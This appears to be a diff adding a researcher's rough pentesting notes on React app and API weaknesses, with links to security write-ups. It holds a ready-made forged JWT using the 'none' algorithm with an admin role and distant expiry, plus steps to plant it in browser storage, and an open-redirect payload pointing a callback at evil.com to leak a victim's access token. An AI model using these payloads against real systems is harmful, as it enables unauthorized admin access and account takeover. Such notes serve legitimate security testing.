@@ -1,0 +1,41 @@
+https://thenewstack.io/plug-security-holes-in-react-apps-that-can-lead-to-api-exploitation/
+
+Note:
+the attacker commot outed the client-side-redirection on devtools
+injected a fake admin priviage JWT token found critical un-auth access
+also some-endpoints does not requireing jwt token even.. also check at client-side ..
+
+{
+"alg": "none",
+"typ": "JWT"
+}
+
+{
+"sub": "admin",
+"role": "admin",
+"exp": 9999999999
+}
+
+final fake token:
+
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
+
+Put the JWT into:
+
+localStorage or sessionStorage
+Refresh the app
+Observe:
+
+Does UI load as admin?
+Do APIs respond without auth?
+
+https://www.traceable.ai/blog-post/how-1-exposed-honeywell-api-gave-us-control-over-an-internal-engineering-system
+Note: fuzz key parameters with server-side-veriable list.
+
+https://blog.quarkslab.com/looking-for-vulnerabilities-in-strapi-cve-2024-34065.html 
+
+open-reditrct to ATO:
+a vulanble ?callback=https://evil.com will leads to leak victims access_token..
+
+
+
